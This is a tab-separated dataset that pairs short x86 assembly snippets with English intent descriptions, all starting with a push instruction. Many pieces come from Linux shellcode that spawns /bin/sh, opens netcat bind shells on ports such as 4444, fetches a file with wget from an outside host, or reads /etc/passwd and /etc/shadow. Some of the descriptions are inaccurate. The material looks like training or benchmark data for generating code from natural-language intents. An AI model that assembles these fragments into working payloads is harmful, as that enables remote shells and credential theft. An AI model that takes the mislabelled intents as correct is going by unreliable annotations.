SNIPPETS	INTENTS
push dword 0x69622f3a	push the dword 0x69622f3a onto the stack
push dword 0x6962732f	push the dword 0x6962732f onto the stack
push dword 0x6b2f7379	push the dword 0x6b2f7379 onto the stack
push dword 0x6b6e756a	push the dword 0x6b6e756a onto the stack
push dword 0x6d6f646e	push the dword 0x6d6f646e onto the stack
push dword 0x6e69622f	push nib/ onto stack
push dword 0x6e69622f	push the dword 0x6e69622f onto the stack
push dword 0x6e69922f	push the dword 0x6e69922f onto the stack
push dword 0x6f702f6e	push the dword 0x6f702f6e onto the stack
push dword 0x6f726577	push the dword 0x6f726577 onto the stack
push dword 0x7264632f	push the dword 0x7264632f onto the stack
push dword 0x72657355	push the dword 0x72657355 onto the stack
push dword 0x732f636f	push the dword 0x732f636f onto the stack
push dword 0x73656c62	push the doubleword 0x73656c62 to the stack
push dword 0x73656c62	push the dword 0x73656c62 onto the stack
push dword 0x73656c62 \n push dword 0x61747069 \n mov edi,esp \n push dword 0x2f2f6e69 \n push dword 0x62732f2f \n mov ebx, esp	load the string iptables in edi regsiter and load the string //sbin // in ebx regsiter
push dword 0x7461632f	push the dword 0x7461632f onto the stack
push dword 0x74652f2f	push the dword 0x74652f2f onto the stack
push dword 0x74652f2f \n mov eax, esp	push double word 0x74652f2f onto the stack and point the eax register to the stack register
push dword 0x74652f2f \n mov ebp, esp	push double word 0x74652f2f onto the stack and point the ebp register to the stack register
push dword 0x74652f2f \n mov ebx, esp	push double word 0x74652f2f onto the stack and point the ebx register to the stack register
push dword 0x74652f2f \n mov ecx, esp	push double word 0x74652f2f onto the stack and point the ecx register to the stack register
push dword 0x74652f2f \n mov edx, esp	push double word 0x74652f2f onto the stack and point the edx register to the stack register
push dword 0x74652f2f \n mov esi, esp	push double word 0x74652f2f onto the stack and point the esi register to the stack register
push dword 0x7665642f	push the dword 0x7665642f onto the stack
push dword 0x776f6461	push the dword 0x776f6461 onto the stack
push dword 0x8140a8c0	push ipv4 address 192.168.64.129 (hex) on stack
push dword 0x8140a8c0	push the doubleword 0x8140a8c0 to the stack
push dword eax	push the double word content of eax on stack
push dword eax	push the doube word eax content on stack
push dword eax	push sin6_addr as dword eax
push dword eax	push the doubleword eax to the stack
push dword eax	push the dword eax onto the stack
push dword eax \n push dword eax	push the double word eax content on stacck two times
push dword eax \n push dword eax \n push dword eax \n push dword eax	push 4 times dword contained in eax that represent ipv6 loopback
push dword eax \n push dword eax \n push dword eax \n push dword eax	push ipv6 loopback on stack as x4 dword eax
push dword eax \n push dword eax \n push dword eax \n push dword eax	push eax content as double word for 4 times
push dword eax \n push dword eax \n push dword eax \n push dword eax \n push dword eax	push the string v6_host.sin6_addr on stack
push dword ebx	push sin6_flowinfo=4 byte saved in ebx on stack
push dword ebx	push the doubleword ebx to the stack
push dword ebx \n push dword ebx	push ebx content as a double word on stack two times
push dx	push dx rergister on the stack
push dx	push dx content on stack
push dx	push dx onto the stack
push eax	push eax onto stack
push eax	push eax on the stack
push eax	push eax contents on the stack
push eax	push null terminating string on stack
push eax	push null
push eax	push eax content on the stack
push eax	push zero on the stack
push eax	push eax content on stack
push eax	push in eax the argument no=0
push eax	push sin6_addr = in6addr_any = ::0
push eax	push zero on stack
push eax	push null terminator on stack
push eax	push eax(socket file descriptor) onto stack
push eax	push nulls for string termination
push eax	push null byte as string terminator
push eax	push null into the stack
push eax	push null on stack
push eax	move 0 to stack (protocol=0)
push eax	push 0 (=eax)
push eax	push ipproto_ip = 0 (eax) on stack
push eax	push sin6_addr, saved in eax, on stack
push eax	push null byte on stack
push eax	push null terminator
push eax	preserve eax on the stack
push eax	push eax onto the stack
push eax	push eax to the stack
push eax	push eax value to the stack
push eax	push the contents of eax onto the stack
push eax	push the contents of eax register onto the stack
push eax	push the contents of the eax register onto the stack
push eax	push the value of register eax onto the stack
push eax \n inc eax	push eax on stack then increment its conent
push eax \n mov ebx, esp	push the contents of the eax register onto the stack and point ebx to the stack register
push eax \n mov ecx, esp	push the contents of the eax register onto the stack and point ecx to the stack register
push eax \n mov edi, 0x343997b7 \n rol edi, 1 \n push edi \n mov esi, 0xd2c45e5e \n ror esi, 1 \n push esi	push null terminating string and ‘/bin/sh’ to the stack
push eax \n mov edx, esp	clear edx
push eax \n mov edx, esp	push null in the edx position
push eax \n mov edx, esp	clear eax register
push eax \n mov edx, esp	envp = 0
push eax \n mov edx, esp	load eax into edx register
push eax \n mov edx, esp	push the contents of the eax register onto the stack and point edx to the stack register
push eax \n mov edx, esp \n push eax \n mov ecx, esp	insert null in edx and ecx
push eax \n mov edx, esp \n push eax \n mov ecx, esp	zero out edx and ecx register
push eax \n mov edx, esp \n push ebx \n mov ecx, esp \n mov al, 0xb \n int 0x80	execute __nr_execve syscall
push eax \n mov edx,esp	push null temrinating string on edx
push eax \n pop ecx	move eax by inserting it in the stack in ecx extracting it from the stack
push eax \n pop edi	load 0 into edi register
push eax \n pop edx	transfer eax contents into edx register
push eax \n pop edx	load eax content into edx
push eax \n push 0x30	push eax and the hexadecimal value 0x30 on the stack
push eax \n push 0x31373737 \n push 0x3170762d \n mov esi, esp	load chained null and the arg -vp17771 into esi register
push eax \n push 0x35353535 \n push 0x70746c2d \n mov ecx, esp	push 0, port number = 5555, command -ltp on stack. ecx point to the top pf the stack.
push eax \n push 0x39393939 \n push 0x39706c2d	push 0-term, 9999, 9pl- on the stack
push eax \n push 0x4b434148	push null terminated string ‘hack’ on stack
push eax \n push 0x636e2f2f \n push 0x6e69622f \n mov ebx, esp	load chained null and the arg /bin//nc into ebx register
push eax \n push 0x636e2f6e \n push 0x69622f2f	push 0-term, cn/n, ib// on the stack
push eax \n push 0x6769666e \n push 0x6f635f64 \n push 0x6873732f \n push 0x6873732f \n push 0x6374652f	push 0-term, gifn, oc_d, hss/, hss/, cte/ on the stack
push eax \n push 0x68732f2f \n push 0x6e69622f \n mov ebx, esp	load ‘/bin//sh\0’ intp ebx register
push eax \n push 0x68732f2f \n push 0x6e69622f \n mov ebx, esp	load ‘/bin//sh\0’ into ebx register
push eax \n push 0x68732f2f \n push 0x6e69622f \n push 0x2f656c2d \n mov edi, esp	load chained null and the arg -le//bin//sh into edi register
push eax \n push 0x68732f2f \n push 0x6e69622f \n push 0x2f656c2d \n mov edx, esp	load chained null and the arg -le//bin//sh into edx register
push eax \n push 0x68732f2f \n push 0x6e69622f \n push ebx, esp \n mov edx, eax \n mov al, 0xb \n int 0x80	execute execve syscall putting null temrinated string ‘/bin//sh’ into ebx register, the parameter 0 into edx and the syscall code into al register.
push eax \n push 0x68732f6e \n push 0x69622f2f \n mov ebx, esp	load the string //bin/sh\0 into ebx regsiter
push eax \n push 0x68736162 \n push 0x2f6e6962 \n push 0x2f2f652d	push 0-term, hsab, /nib, //e- on the stack
push eax \n push 0x6c6c6568 \n push 0x2f6d3462 \n push 0x6d33622f \n push 0x2f2f2f6d \n push 0x6f632e73 \n push 0x616d6978 \n push 0x656d2e33 \n mov ecx, esp	save null terminated string ‘3.meximas.com////b3mb4m/hell’ into ecx register
push eax \n push 0x7361642f \n push 0x6e69622f \n mov ebx, esp	load null terminate string ‘/bin/das’ into ebx regsiter
push eax \n push 0x7461632f \n push 0x6e69622f	push 0-term, tac/, nib/ on the stack
push eax \n push 0x74656777 \n push 0x2f6e6962 \n push 0x2f727375 \n push 0x2f2f2f2f \n mov ebx, esp	load null terminated string ‘////usr/bin/wget’ intp ebx regsiter
push eax \n push 0x746f6f62 \n push 0x65722f6e \n push 0x6962732f \n mov ebx, esp	load null temrinated string ‘/sbin/reboot’ into ebx register
push eax \n push 0x746f6f62 \n push 0x65722f6e \n push 0x6962732f \n mov ebx, esp	load null terminated string ‘sbin/reboot’ into ebx register
push eax \n push byte +0x68 \n mov ebx,esp	load eax content and the byte +0x68 into ebx register
push eax \n push byte 0x1 \n push byte 0x2	push the parameters (0, sock_stream =1, af_inet=2) on stack
push eax \n push byte 0x1 \n push byte 0x2 \n mov ecx, esp	push the protocol 0, the type, sock_stream, and the domain af_inet on the stack and then load the stack pointer into ecx register
push eax \n push dword 0x39396e2d	put 0-term and the word 99n- on stack
push eax \n push dword 0x64616568 \n push dword 0x2f6e6962 \n push dword 0x2f2f2f2f \n push dword 0x7273752f	put 0-term and the double words daeh, /nib, ////, rsu/ on the stack
push eax \n push dword 0x64777373 \n push dword 0x61702f63 \n push dword 0x74652f2f	put 0-term, dwss, ap/c, te// on stack
push eax \n push eax	push eax content on the stack 2 times
push eax \n push eax	push null two times on stack
push eax \n push eax \n push ecx \n push ebx \n mov ecx, esp	load eax two times, ecx and ebx into ecx register
push eax \n push ebp \n push edi \n \n push esi \n push ebx	push eax, ebp, edi, esi, ebx on the stack
push eax \n push ebx	push eax and ebx content on stack
push eax \n push ebx	push ebx and eax on stack
push eax \n push ebx	push eax and ebx contents on stack
push eax \n push ebx \n mov ecx, esp	load eax and ebx contents chained into ecx register
push eax \n push ecx \n push ebx	push eax,ecx and ebx contents on stack
push eax \n push ecx \n push esi \n mov ecx,esp	push eax, ecx and esi on the stack and then load the stack pointer in ecx register
push eax \n push edi	push eax and edi contents on the stack
push eax \n push edi \n push esi \n push ebx	push 0-term, the args in edi, the args in esi and the pointer to /user////bin/head on the stack
push eax \n push edi \n push esi \n push ebx \n mov ecx, esp	load eax, edi, esi, ebx contents into ecx register
push eax \n push edi \n push esi \n push ebx \n mov ecx, esp	chain the register eax,edi, esi, ebx and load the contents on ecx register
push eax \n push edi \n push esi \n push ebx \n mov ecx, esp	concatenate the content of eax, edi, esi, ebx and load them into ecx register
push eax \n push edx	push eax and edx on the stack
push eax \n push edx	push eax and edx contents on stack
push eax \n push edx \n push ecx \n push ebx \n mov edi, esp	load eax, edx, ecx and ebx contents chanined into edi register
push eax \n push edx \n push esi \n push ebx	push eax, edx, esi, ebx contents on the stack
push eax \n push esi \n push ebx	push eax, esi and bx contents on the stack
push eax \n push esi \n push edi \n push ebx	push eax, esi, edi and ebx contents on stack
push eax \n push esp	push eax and esp register on the stack
push eax \n push word 0x6873 \n push 0x61622f2f \n push 0x6e69622f \n mov ebx,esp	load the string “/bin//bash\0” into ebx register
push eax \n xor eax, eax \n mov al, 1	push eax register on the satck than clear it and put the number of the syscall exit in its laast byte
push ebp	save old base pointer
push ebp	save the old base pointer value
push ebp	push the contents of the ebp register onto the stack
push ebp	push the ebp onto the stack
push ebp	push ebp onto the stack
push ebx	insert ebx on the stack
push ebx	push ebx on the stack
push ebx	push ebx content on the stack
push ebx	push ebx content i on the stack
push ebx	push the command to run on stack
push ebx	push backlog value equals to 2 on stack
push ebx	push ebx content on stack
push ebx	push 0 on stack
push ebx	push the sock file descriptor stored in ebx
push ebx	"push ""/bin/sh"" on stack"
push ebx	push ebx(0) onto stack (ipproto_ip = 0)
push ebx	push ebx(1) onto stack (sock_stream = 1)
push ebx	push the string ‘////bin/bash’ on tsack
push ebx	push the pointer to /bin/bash
push ebx	push ptr addr on stack
push ebx	push pointer
push ebx	value in ebx=1 is pushed in to the stack (sock_stream =1)
push ebx	pushe 0 onto the stack for first arg of inaddr_any for the local host
push ebx	pushes the 2nd arg for connection que size to 0
push ebx	pushes the memory address of the string onto the stack
push ebx	push ebx on stack
push ebx	push address of /bin/sh
push ebx	preserve ebx on the stack
push ebx	push the contents of ebx register onto the stack
push ebx	push the contents of the ebx register onto the stack
push ebx	push the ebx value to the stack
push ebx	push ebx onto the stack
push ebx	push the contents of ebx onto the stack
push ebx	push ebx to the stack
push ebx \n inc ebx \n push ebx	push ebx on stack, increment its content by1 and push it again on stack
push ebx \n mov eax, esp	push the contents of the ebx register onto the stack and point eax to the stack register
push ebx \n mov ecx, esp	push ebx in the stack and then move its contents into ecx register
push ebx \n mov ecx, esp	move the character x from ebx register to ecx register
push ebx \n mov ecx, esp	"moving the pointer to ""/bin//sh"" to ecx"
push ebx \n mov ecx, esp	load ebx into ecx register
push ebx \n mov ecx, esp	push the contents of the ebx register onto the stack and point ecx to the stack register
push ebx \n mov ecx,esp	push ebx content on the satck and load it into ecx register
push ebx \n mov edx, esp	push the contents of the ebx register onto the stack and point edx to the stack register
push ebx \n pop ecx	load ebx content into ecx register
push ebx \n push 0x1 \n push 0xa	push on stack the arguemnts ip_proto = 0, sock_stream =1, pf_inet6 = 10
push ebx \n push 0x4	push ebx and the value 0x4 on stack
push ebx \n push 0x6 \n pop eax	load ebx content concatenating with hexadecimal value 0x6 into eax reister
push ebx \n push byte 10	push ebx contente and the byte 10 on stack
push ebx \n push ebx	push null on stack two times
push ebx \n push ebx	push 0 two times
push ebx \n push ebx \n push esi	push ebx two times and esi content on stack
push ebx \n push ebx \n push esi	push ebx two times andesi contents on stack
push ebx \n push ecx	push ebx and ecx contents on stack
push ecx	push null in stack
push ecx	push ecx on the satck
push ecx	load the real ip address in the stack
push ecx	push ecx content on the stack
push ecx	push ecx on stack
push ecx	push the pointer v4lhost on stack
push ecx	push the pointer to struct on stack
push ecx	push the pointer to sockfd on stack
push ecx	push null on stack
push ecx	push the pointer to host_sockfd
push ecx	push ecx on register
push ecx	push null terminating string on stack
push ecx	push the pointer to sock addr stored in ecx
push ecx	push ecx(struct pointer) onto the stack
push ecx	push \x00 to the stack
push ecx	push pointer address on stack
push ecx	push serv_addr saved in ecx
push ecx	push struct pointer
push ecx	push the memory location of previous args onto the stack
push ecx	push ecx content on stack
push ecx	push &serv_addr saved in ecx
push ecx	preserve ecx on the stack
push ecx	push the contents of the ecx register onto the stack
push ecx	push the value of register ecx onto the stack
push ecx	push ecx onto the stack
push ecx	push the contents of ecx register onto the stack
push ecx	push the ecx onto the stack
push ecx	push ecx on the stack
push ecx	push ecx to the stack
push ecx	push the contents of the ecx register onto the stack.
push ecx \n mov ecx,esp	push ecx on the stack and then place pointer to ecx
push ecx \n mov edx,esp	push ecx on the stack and then place pointer to edx
push ecx \n pop edi	load ecx contents into edi register
push ecx \n push 0x2 \n push 0x2	push ecx content, the value 0x2 two times on stack
push ecx \n push 0x64777373 \n push 0x61702f2f \n push 0x6374652f \n mov ecx,esp	load ‘/etc//passwd’ and null teminating string into ecx register
push ecx \n push 0x68732f2f \n push 0x6e69622f \n mov ebx, esp	load ‘/bin//sh\0’ on ebx register
push ecx \n push 0x68732f2f \n push 0x6e69622f \n mov ebx,esp	push the string /bin//sh\0\0\0\0\0\0\0\0 on the stack and place pointer to eb
push ecx \n push 0x68736162 \n push 0x2f6e6962 \n push 0x2f2f2f2f	push ecx cotent, ‘hsab’, ‘/nib’ and ‘////’ on stack
push ecx \n push 0x7461632f \n push 0x6e69622f \n mov ebx,esp	load ‘/bin/cat’ and null teminating string into ebx register
push ecx \n push 0x8 \n push edx \n push esi \n mov ecx, esp	load ecx content, hexadecimal value 0x8, edx content, esi content into ecx register
push ecx \n push 0xb \n pop eax \n push 0x68732f2f \n push 0x6e69622f \n mov ebx,esp	load __nr_execve syscall into eax register and the string ‘/bin//sh\0’ into ebx register
push ecx \n push dword 0x68732f2f \n push dword 0x6e69622f \n mov ebx, esp	load ‘/bin//sh\0’ into ebx register
push ecx \n push eax	push the pointer to sockaddr and the fd received previously on stack
push ecx \n push ebx	push ecx and ebx content on stack
push ecx \n push ebx \n mov ecx,esp	load the string /usr/bin/wget 192.168.1.93//x </dev/null2<&1 in ecx register
push ecx \n push ebx \n pop ebx	save null terminating string ‘/bin/sh’ into ebx
push ecx \n push ebx \n push dword 0x2 \n mov ecx, esp	push ecx and ebx contents and 32 bit equal to 2 on the stack and then put esp in ecx
push ecx \n push ecx \n push esi	push the value 0 to the stack for 2 times and then push esi
push ecx \n push esi	push ecx and esi contents on the stack
push ecx \n push esi	push ecx and esi contents on stack
push ecx \n push esi	push ecx and esi contents
push ecx \n push word 0x5c11 \n push word 0x2 \n mov ecx, esp	load ecx content, af_inet in 32bit and the 32bit value 4444 on ecx
push edi	push nib// in stack
push edi	push the string //sbin// on the stack
push edi	push edi content on the stack
push edi	"push ""c-"" on stack"
push edi	push edi content
push edi	push ‘-c’ value on stack
push edi	push the edi onto the stack
push edi	push edi to the stack
push edi	push the contents of the edi register onto the stack
push edi	push edi onto the stack
push edi	push the contents of edi register onto the stack
push edi \n mov eax, esp	push the contents of the edi register onto the stack and point eax to the stack register
push edi \n mov ebx, esp	push the contents of the edi register onto the stack and point ebx to the stack register
push edi \n mov ecx, esp	push the contents of the edi register onto the stack and point ecx to the stack register
push edi \n mov edx, esp	push the contents of the edi register onto the stack and point edx to the stack register
push edi \n pop esi	load esi content into esi register
push edi \n push word 100 \n push edi \n push esi	push edi content, the buffer size = 100 as a word, edi content and socketfd (esi) on stack
push edx	push edx register on the stack
push edx	push null on the stack
push edx	push null byte on the stack
push edx	load null byte on the stack
push edx	push edx on stack
push edx	push inaddr_any = 0 on the stack
push edx	push null string terminator on stack
push edx	push null argv on stack
push edx	push edx contet om stack
push edx	push edx content on stack
push edx	push null on stack
push edx	push terminating null on stack
push edx	push edx(0) onto the stack (inaddr_any = 0)
push edx	push 00 onto the stack
push edx	push null termination string on stack
push edx	push file descriptor on stack
push edx	push protocol id = 0
push edx	push socket file descriptor saved in edx
push edx	push null
push edx	push 0 on to stack (inaddr_any)
push edx	push 0 onto stack (backlog=0)
push edx	pushes the old socket fd onto the stack
push edx	push current socket fd onto the stack
push edx	push the socket fd onto the stack
push edx	push our socket fd onto the stack
push edx	push edx content
push edx	push edx
push edx	push inaddr_any = 0
push edx	push zero addrlen on stack
push edx	push null sockaddr on stack
push edx	preserve edx on the stack
push edx	push edx to the stack
push edx	push the contents of edx register onto the stack
push edx	push the contents of the edx register onto the stack
push edx	push the value of register edx onto the stack
push edx	push edx onto the stack
push edx	push edx on the stack
push edx \n mov eax, 0xb33fb33f \n sub eax, 0x3bd04ede \n push eax	push null terminated string ‘adow’ on stack
push edx \n mov eax, esp	push the contents of the edx register onto the stack and point eax to the stack register
push edx \n mov ebx, esp	push the contents of the edx register onto the stack and point ebx to the stack register
push edx \n mov ecx, esp	push the contents of the edx register onto the stack and point ecx to the stack register
push edx \n push 0x6563726f \n push 0x666e6574 \n push 0x65732f6e \n push 0x6962732f \n push 0x7273752f	push null termination string and the string ‘/usr/sbin/setenforce’ on the stack
push edx \n push 0x68732f2f \n push 0x6e69622f	push null terminated /bin//sh on stack
push edx \n push 0x68732f2f \n push 0x6e69622f \n mov ebx, esp	push /bin//sh +\x00 on the stack and then point ebx where that string is located
push edx \n push 0x68732f2f \n push 0x6e69622f \n mov ebx, esp	load null bytes, ‘//sh’ and ‘/bin’ into ebx register
push edx \n push 0x68732f2f \n push 0x6e69622f \n mov ebx,esp	load ‘/bin//sh\0’ into ebx register
push edx \n push 0x68735858	push edx and the hexadecimal value 0x68735858 on the stack
push edx \n push byte 0x30	push edx and the value 0x30 onto the stack
push edx \n push byte 0x77 \n push word 0x6f64 \n mov esi, 0x222933f0 \n add esi, 0x3f3f3f3f \n push esi \n xor esi, esi \n mov esi, 0x243525f0 \n add esi, 0x3f3f3f3f \n push esi \n xor esi, esi \n mov ebx, esp	load the string /cte/shadow on ebx register
push edx \n push eax \n push ebx	push edx, eax and ebx on the stack
push edx \n push ebx	push edx and ebx content on stack
push edx \n push ebx	push edx content two times on stack
push edx \n push ebx \n push 2	pusg protocol = 0, sock_stream = 1 and af_inter = 2 on stack
push edx \n push ecx \n push eax	push edx, ecx and eax contents on stack
push edx \n push ecx \n push ebx	push edx, ecx and ebx content on stack
push edx \n push ecx \n push ebx \n mov ecx, esp	push edx, ecx and ebx contents on the stack
push edx \n push ecx \n push ebx \n push eax \n push esp \n push ebp \n push esi \n push edi	push edx, ecx, ebx, eax, esp, ebp, esi and edi registers on the stack
push edx \n push edi	push edx and edi on stack
push edx \n push edi \n push ebx	push edx, edi and ebx content on stack
push edx \n push edx	push null two times on satck
push edx \n push edx \n mov ecx, esp	push two times edx on the stack and then load the stack pointer in ecx register
push edx \n push edx \n push esi	push edx content two times and esi content on stack
push edx \n push edx \n push esi	push edx content two times and esi content onto the stack
push edx \n push edx \n push esi \n mov ecx, esp	push edx two times ad esi on the stack and then load the stack pointer into ecx register
push edx \n push esi	push edx and esi content on stack
push edx \n push esi \n mov ecx, esp	save 0 and socket file descriptor in ecx
push edx \n push esi \n mov ecx, esp	save socket file descriptor and 0 in ecx
push edx \n push esi \n mov ecx, esp	push edx and esi contents on the stack and then load the stack pointer into ecx register
push edx \n push esi \n push ebp \n push ebx \n mov ecx, esp	load edx, esi, ebp and ebx contentsinto ecx register
push edx \n push esi \n push edi \n push ebx \n mov ecx, esp	chain the contents of the registers edx, esi, edi and ebx and save them into ecx register
push edx \n push word 0x5c11 \n push word 0x02 \n mov ecx, esp	save af_inet in 32bit, the 32bit value 4444, edx contents on ecx
push edx \n push word 0x8223 \n push word bx	push on stack the word array : [0, port_num, 2]
push edx \n push word 0xaaaa \n push word 2 \n mov ecx, esp	push a word null, a word of a characters and a word of 2 on the stack then load the stack pointer into ecx register
push esi	push hs/ in stack
push esi	push the pointer to -f
push esi	push esi content on stack
push esi	push the socket file descriptor on stack
push esi	push socket file descriptor on stack
push esi	push the sockfd on stack
push esi	push the host_sockfd
push esi	push the pointer to host_sockfd stored in esi on stack
push esi	push host_sockfd
push esi	push encoded_shellcode pointer to stack for later execution
push esi	push null termination
push esi	push the pointer to the /tmp/.xe
push esi	push file descriptor on stack
push esi	push sockfd (sock_file_des) onto stack
push esi	push sockfd on stack
push esi	push sockfd saved into esi
push esi	push sockfd (esx) on stack
push esi	preserve esi on the stack
push esi	push the contents of the esi register onto the stack
push esi	push the contents of the esi register onto the stack.
push esi	push the esi onto the stack
push esi	push esi onto the stack
push esi	push the contents of esi register onto the stack
push esi	push esi on the stack
push esi	push esi to the stack
push esi	push the encoded shellcode pointer to stack
push esi \n mov eax, esp	push the contents of the esi register onto the stack and point eax to the stack register
push esi \n mov ebx, esp	push the contents of the esi register onto the stack and point ebx to the stack register
push esi \n mov ecx, esp	push the contents of the esi register onto the stack and point ecx to the stack register
push esi \n mov edi, esi	push the stack onto esi and move the contents on edi
push esi \n mov edx, esp	push the contents of the esi register onto the stack and point edx to the stack register
push esi \n push 0x68732f2f \n push 0x6e69622f	push null terminated string ‘/bin//sh’ on stack
push esi \n push edi	push /bin//sh in stack
push esi \n push edi	push esi and edi content on stack
push esi \n push edi \n push edx	push esi, edi and edx content on stack
push esp	push esp content on stack
push esp	push the memory location of param 1(sizeof) onto the stack
push esp	push the contents of esp register onto the stack
push esp	push the contents of the esp register onto the stack
push esp	push the esp onto the stack
push esp	push esp to the stack
push esp	push esp onto the stack
push len	push len onto the stack
push len \n pop edx	save len into edx registe
push long 0x68732f2f \n push long 0x6e69622f \n mov eax, esp	move /bin/sh into the eax register
push long 0x68732f2f \n push long 0x6e69622f \n mov ebx, esp	move the string /bin//sh on ebx register
push long 0x68732f2f \n push long 0x6e69622f \n mov ebx, esp	move /bin/sh into the ebx register
push long 0x68732f2f \n push long 0x6e69622f \n mov ecx, esp	put /bin/sh into the ecx register
push long 0x68732f2f \n push long 0x6e69622f \n mov edx, esp	put /bin/sh into the edx register
push name	push name onto the stack
push offset printf_msg	push address of string print_msg
push ogin	push the contents in ogin onto the stack
push rcx	push the immediate value stored in rcx onto the stack
push sock_reg	push sock_reg onto the stack
push sock_reg	push the sock_reg onto the stack
push sys_execve	push sys_execve onto the stack
push sys_execve \n pop eax	set sys_execve = 11 to eax
push word [edx]	push edx content as a word on stack
push word [edx]	push the word [edx] onto the stack
push word [edx]	push the word [edx] to the stack
push word 0544o	push the word 0544o onto the stack
push word 0544o \n pop ecx	allow permissions r-xr--r—save them into ecx
push word 0644o	push the word 0644o onto the stack
push word 0666q	set read-write permission
push word 0666q	push the word 0666q onto the stack
push word 0x02	push af_inet on the stack
push word 0x02	push af_inet = 2 on stack
push word 0x02	push the word 0x02 onto the stack
push word 0x0a	push the argument pf_inet6 = 10 on stack
push word 0x0a	push the argument af_inet6 = 10 on stack
push word 0x0a	push word af_inet6
push word 0x0a	push af_inet6 = 10 as word on stack
push word 0x0a	push af_inet = 0x0a
push word 0x0a	push the word 0x0a onto the stack
push word 0x0a	push the word 0x0a to the stack
push word 0x0f27	push the word 0x0f27 onto the stack
push word 0x1b6	push the word 0x1b6 to the stack
push word 0x1b6	push the word 0x1b6 onto the stack
push word 0x1b6 \n pop ecx	save read-write permission in ecx register
push word 0x1ff	push the word 0x1ff onto the stack
push word 0x2	push the word 0x2 on stack
push word 0x2	push hexadecimal value 0x2 on stack
push word 0x2	push hexadecimal value 0x2 as a word on stack
push word 0x2	push af_inet on stack
push word 0x2	push af_inet = 2
push word 0x2	push the arg af_inet onto the stack
push word 0x2	push the word 0x2 onto the stack
push word 0x2	push the word 0x2 to the stack
push word 0x2923	push 0x2923 onto stack port
push word 0x2e2e	push the word 0x2e2e onto the stack
push word 0x3436	push the value 46 on the stack
push word 0x3436	push the word 0x3436 onto the stack
push word 0x3582	push port 0x3582 as a word
push word 0x3582	push port number 0x3582 as a word on stack
push word 0x3582	push the word 0x3582 onto the stack
push word 0x3636	push the word 0x3636 onto the stack
push word 0x3905	push the value of the port, 1337, on 32 bit in big endian format
push word 0x3905	push the value of port 1336 on 32 bit on stack
push word 0x3905	push the word 0x3905 to the stack
push word 0x3905	push the word 0x3905 onto the stack
push word 0x3930	push the word 0x3930 onto the stack
push word 0x401f	push the word 0x401f onto the stack
push word 0x4255	push the word 0x4255 onto the stack
push word 0x462d	push ‘-f’ on stack
push word 0x462d	push the word 0x462d to the stack
push word 0x462d	push the word 0x462d onto the stack
push word 0x5000	push 0x5000 onto stack port
push word 0x5445	push the word 0x5445 onto the stack
push word 0x5974	push the word 0x5974 onto the stack
push word 0x5c11	insert the 32bit value 4444 on the stack
push word 0x5c11	push the hexdadecimal value of 4444 on the stack
push word 0x5c11	push the number of the port, 4444, on the stack
push word 0x5c11	push the value 4444 of the port on stack
push word 0x5c11	push dword port value = 4444
push word 0x5c11	push port value = 4444 as a word
push word 0x5c11	push port value 4444 as word on stack
push word 0x5c11	push 0x5c11 onto the stack (port:4444)
push word 0x5c11	push the port number 4444 (hex) on stack
push word 0x5c11	push port number 4444 as a word
push word 0x5c11	push htons(4444)
push word 0x5c11	set the port to bind on, in reverse order is 4444
push word 0x5c11	push the word 0x5c11 onto the stack
push word 0x5c11	push the word 0x5c11 to the stack
push word 0x632d	push -c param on the stack
push word 0x632d	push the word paramenter -c on the stack
push word 0x632d	push the parameter “c-“ as a word on stack
push word 0x632d	push the value ‘-c’ on stack
push word 0x632d	push the word 0x632d onto the stack
push word 0x632d	push the word 0x632d to the stack
push word 0x632d \n mov eax, esp	push the word 0x632d onto the stack and point the eax register to the stack register
push word 0x632d \n mov ebx, esp	push the word 0x632d onto the stack and point the ebx register to the stack register
push word 0x632d \n mov ecx, esp	push the word 0x632d onto the stack and point the ecx register to the stack register
push word 0x632d \n mov edi, esp	push the word 0x632d onto the stack and point the edi register to the stack register
push word 0x632d \n mov edx, esp	push the word 0x632d onto the stack and point the edx register to the stack register
push word 0x632d \n mov esi, esp	push the word 0x632d onto the stack and point the esi register to the stack register
push word 0x6465	push the word 0x6465 onto the stack
push word 0x6465 \n push 0x7268732f \n push 0x6e69622f \n push 0x7273752f \n mov ebx, esp	load the strig /usr/bin/shred in ebx regiter
push word 0x662d	push the word 0x662d onto the stack
push word 0x662d \n mov eax, esp	push the word 0x662d onto the stack and point the eax register to the stack register
push word 0x662d \n mov ebx, esp	push the word 0x662d onto the stack and point the ebx register to the stack register
push word 0x662d \n mov ecx, esp	push the word 0x662d onto the stack and point the ecx register to the stack register
push word 0x662d \n mov edi, esp	push the word 0x662d onto the stack and point the edi register to the stack register
push word 0x662d \n mov edx, esp	push the word 0x662d onto the stack and point the edx register to the stack register
